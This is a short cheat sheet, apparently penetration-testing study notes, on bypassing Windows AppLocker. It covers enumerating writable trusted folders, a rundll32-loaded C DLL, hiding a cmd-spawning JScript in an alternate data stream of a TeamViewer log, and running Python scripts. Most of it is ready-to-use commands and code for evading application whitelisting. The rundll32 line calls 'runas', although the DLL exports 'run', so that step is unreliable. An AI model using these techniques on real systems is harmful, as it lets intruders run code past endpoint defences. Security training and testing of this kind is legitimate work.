# Basic Bypasses



## Trusted Folders

The default rules for AppLocker whitelist all executables and scripts located in C:\Program Files, C:\Program Files (x86), and C:\Windows

```bash
# Search for user-writable folders recursively
accesschk.exe "student" C:\Windows -wus
# Check if directory is executeable
icacls.exe C:\Windows\Tasks
```

## Bypass With DLLs

The default ruleset doesn't protect against loading arbitrary DLLs

C code for an unmanaged DLL that opens a message box

```c
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```

```bash
# Run above code comiled from command prompt
rundll32 C:\Tools\TestDLL.dll,runas
```

## Alternate Data Streams

Simple Jscript proof of concept save as test.js

```javascript
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```

```bash
# Copying the contents of test.js into an ADS of the log file
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
# Verify the ADS section with dir
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
# Execute the contents of the alternate data stream
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

## Third Party Execution

```bash
# Bypassing AppLocker with Python
echo print("This executed") > test.py
python test.py
```
